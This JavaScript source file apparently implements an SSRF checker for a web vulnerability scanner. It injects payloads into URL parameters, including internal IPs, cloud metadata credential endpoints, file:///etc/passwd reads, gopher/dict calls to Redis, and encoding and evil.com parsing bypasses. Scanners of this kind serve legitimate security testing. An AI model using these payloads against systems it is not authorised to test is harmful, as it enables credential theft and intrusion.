import { httpGet, httpRequest } from '../../utils/http-client.js';
import { URLParser } from '../input/url-parser.js';
import { generateId } from '../../utils/helpers.js';
import logger from '../../utils/logger.js';

/**
 * SSRF Checker - Server-Side Request Forgery detection
 */
export class SSRFChecker {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.callbackServer = options.callbackServer || null;
    this.results = [];
  }

  /**
   * Full SSRF scan
   */
  async scan(url, options = {}) {
    logger.info(`[SSRF] Scanning: ${url}`);
    const findings = [];

    const parsed = URLParser.parse(url);
    if (!parsed) return findings;

    // Find URL-like parameters
    const urlParams = this._findUrlParams(parsed.params);
    if (urlParams.length === 0) {
      logger.debug(`[SSRF] No URL parameters found for ${url}`);
      return findings;
    }

    logger.info(`[SSRF] Testing ${urlParams.length} URL parameters...`);

    for (const param of urlParams) {
      // Test internal access
      const internalResult = await this._testInternalAccess(url, param);
      if (internalResult) {
        findings.push(internalResult);
        logger.vuln('high', `[SSRF] Internal access via ${param} @ ${url}`);
      }

      // Test cloud metadata
      const metadataResult = await this._testCloudMetadata(url, param);
      if (metadataResult) {
        findings.push(metadataResult);
        logger.vuln('critical', `[SSRF] Cloud metadata access via ${param} @ ${url}`);
      }

      // Test URL schemes
      const schemeResult = await this._testSchemes(url, param);
      if (schemeResult) {
        findings.push(schemeResult);
        logger.vuln('high', `[SSRF] URL scheme bypass via ${param} @ ${url}`);
      }

      // Test with bypasses
      const bypassResult = await this._testBypasses(url, param);
      if (bypassResult) {
        findings.push(bypassResult);
        logger.vuln('high', `[SSRF] Bypass technique via ${param} @ ${url}`);
      }
    }

    this.results.push(...findings);
    return findings;
  }

  /**
   * Find parameters that likely accept URLs
   */
  _findUrlParams(params) {
    const urlParamNames = [
      'url', 'uri', 'link', 'src', 'source', 'href', 'redirect', 'return',
      'next', 'goto', 'target', 'dest', 'destination', 'rurl', 'return_url',
      'redirect_url', 'redirect_uri', 'callback', 'path', 'file', 'page',
      'load', 'fetch', 'proxy', 'request', 'img', 'image', 'feed',
      'to', 'out', 'view', 'site', 'domain', 'host', 'endpoint',
    ];

    const found = [];
    for (const [key, value] of Object.entries(params)) {
      const keyLower = key.toLowerCase();
      if (urlParamNames.some(name => keyLower.includes(name))) {
        found.push(key);
      } else if (value && (value.startsWith('http') || value.startsWith('//'))) {
        found.push(key);
      }
    }
    return found;
  }

  /**
   * Test internal IP access
   */
  async _testInternalAccess(url, param) {
    const internalTargets = [
      'http://127.0.0.1',
      'http://localhost',
      'http://127.0.0.1:80',
      'http://127.0.0.1:443',
      'http://127.0.0.1:22',
      'http://127.0.0.1:8080',
      'http://[::1]',
      'http://0.0.0.0',
      'http://10.0.0.1',
      'http://172.16.0.1',
      'http://192.168.0.1',
      'http://192.168.1.1',
    ];

    // Get baseline
    const baseUrl = url.split('?')[0];
    const parsed = URLParser.parse(url);
    const baselineParams = { ...parsed.params, [param]: 'https://www.google.com' };
    const baselineUrl = URLParser.buildUrl(baseUrl, baselineParams);
    const baseline = await httpGet(baselineUrl, { timeout: this.timeout });
    const baselineBody = typeof baseline.data === 'string' ? baseline.data : '';

    for (const target of internalTargets) {
      try {
        const testParams = { ...parsed.params, [param]: target };
        const testUrl = URLParser.buildUrl(baseUrl, testParams);
        const response = await httpGet(testUrl, { timeout: this.timeout });
        const body = typeof response.data === 'string' ? response.data : '';

        // Check for signs of internal access
        if (this._hasInternalIndicators(body, baselineBody)) {
          return {
            id: generateId('SSRF'),
            type: 'ssrf-internal',
            severity: 'high',
            url,
            parameter: param,
            payload: target,
            evidence: 'Response contains internal service indicators',
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status} (${body.length} bytes)`,
            confidence: 80,
            timestamp: new Date().toISOString(),
          };
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Test cloud metadata endpoints
   */
  async _testCloudMetadata(url, param) {
    const metadataEndpoints = [
      // AWS
      { url: 'http://169.254.169.254/latest/meta-data/', cloud: 'AWS', indicator: 'ami-id' },
      { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', cloud: 'AWS', indicator: 'AccessKeyId' },
      { url: 'http://169.254.169.254/latest/user-data/', cloud: 'AWS', indicator: '' },
      // GCP
      { url: 'http://metadata.google.internal/computeMetadata/v1/', cloud: 'GCP', indicator: 'attributes' },
      { url: 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', cloud: 'GCP', indicator: 'access_token' },
      // Azure
      { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', cloud: 'Azure', indicator: 'compute' },
      // DigitalOcean
      { url: 'http://169.254.169.254/metadata/v1/', cloud: 'DigitalOcean', indicator: 'droplet_id' },
    ];

    const baseUrl = url.split('?')[0];
    const parsed = URLParser.parse(url);

    for (const endpoint of metadataEndpoints) {
      try {
        const testParams = { ...parsed.params, [param]: endpoint.url };
        const testUrl = URLParser.buildUrl(baseUrl, testParams);
        const response = await httpGet(testUrl, {
          timeout: this.timeout,
          headers: { 'Metadata-Flavor': 'Google' }, // For GCP
        });
        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');

        if (response.status === 200 && endpoint.indicator && body.includes(endpoint.indicator)) {
          return {
            id: generateId('SSRF'),
            type: 'ssrf-cloud-metadata',
            severity: 'critical',
            url,
            parameter: param,
            payload: endpoint.url,
            cloud: endpoint.cloud,
            evidence: `Cloud metadata (${endpoint.cloud}) accessible: found "${endpoint.indicator}" in response`,
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status} - ${body.substring(0, 200)}`,
            confidence: 95,
            timestamp: new Date().toISOString(),
          };
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Test URL schemes
   */
  async _testSchemes(url, param) {
    const schemes = [
      { payload: 'file:///etc/passwd', indicator: 'root:', desc: 'Local file read (Linux)' },
      { payload: 'file:///c:/windows/win.ini', indicator: '[fonts]', desc: 'Local file read (Windows)' },
      { payload: 'file:///etc/hosts', indicator: 'localhost', desc: 'Hosts file read' },
      { payload: 'dict://127.0.0.1:6379/INFO', indicator: 'redis_version', desc: 'Dict protocol (Redis)' },
      { payload: 'gopher://127.0.0.1:6379/_INFO', indicator: 'redis', desc: 'Gopher protocol' },
    ];

    const baseUrl = url.split('?')[0];
    const parsed = URLParser.parse(url);

    for (const scheme of schemes) {
      try {
        const testParams = { ...parsed.params, [param]: scheme.payload };
        const testUrl = URLParser.buildUrl(baseUrl, testParams);
        const response = await httpGet(testUrl, { timeout: this.timeout });
        const body = typeof response.data === 'string' ? response.data : '';

        if (body.includes(scheme.indicator)) {
          return {
            id: generateId('SSRF'),
            type: 'ssrf-scheme',
            severity: 'critical',
            url,
            parameter: param,
            payload: scheme.payload,
            evidence: `${scheme.desc}: found "${scheme.indicator}" in response`,
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status}`,
            confidence: 95,
            timestamp: new Date().toISOString(),
          };
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Test SSRF bypasses
   */
  async _testBypasses(url, param) {
    const bypasses = [
      // IP encoding bypasses
      { payload: 'http://0x7f000001/', desc: 'Hex IP' },
      { payload: 'http://2130706433/', desc: 'Decimal IP' },
      { payload: 'http://0177.0.0.1/', desc: 'Octal IP' },
      { payload: 'http://127.1/', desc: 'Short IP' },
      { payload: 'http://127.0.0.1.nip.io/', desc: 'DNS rebinding (nip.io)' },
      // URL parsing bypasses
      { payload: 'http://evil.com@127.0.0.1/', desc: 'URL auth bypass' },
      { payload: 'http://127.0.0.1#@evil.com/', desc: 'Fragment bypass' },
      { payload: 'http://127.0.0.1%00@evil.com/', desc: 'Null byte bypass' },
      // Redirect-based
      { payload: 'http://httpbin.org/redirect-to?url=http://127.0.0.1/', desc: 'Open redirect chain' },
    ];

    const baseUrl = url.split('?')[0];
    const parsed = URLParser.parse(url);

    for (const bypass of bypasses) {
      try {
        const testParams = { ...parsed.params, [param]: bypass.payload };
        const testUrl = URLParser.buildUrl(baseUrl, testParams);
        const response = await httpGet(testUrl, { timeout: this.timeout });
        const body = typeof response.data === 'string' ? response.data : '';

        if (this._hasInternalIndicators(body, '')) {
          return {
            id: generateId('SSRF'),
            type: 'ssrf-bypass',
            severity: 'high',
            url,
            parameter: param,
            payload: bypass.payload,
            bypassTechnique: bypass.desc,
            evidence: `SSRF bypass successful using: ${bypass.desc}`,
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status}`,
            confidence: 75,
            timestamp: new Date().toISOString(),
          };
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Check for internal service indicators
   */
  _hasInternalIndicators(body, baseline) {
    const indicators = [
      'root:', '/bin/bash', 'daemon:', // /etc/passwd
      'localhost', '127.0.0.1', // hosts file
      'redis_version', 'connected_clients', // Redis
      'Server: Apache', 'Server: nginx', // Internal web servers
      'phpinfo()', 'PHP Version', // PHP info
      'ami-id', 'instance-id', // AWS metadata
      'access_token', 'AccessKeyId', // Cloud credentials
      '<title>Dashboard</title>', // Internal dashboards
    ];

    // Body must be significantly different from baseline
    if (baseline && Math.abs(body.length - baseline.length) < 50) return false;

    return indicators.some(ind => body.includes(ind) && !baseline.includes(ind));
  }
}

export default SSRFChecker;
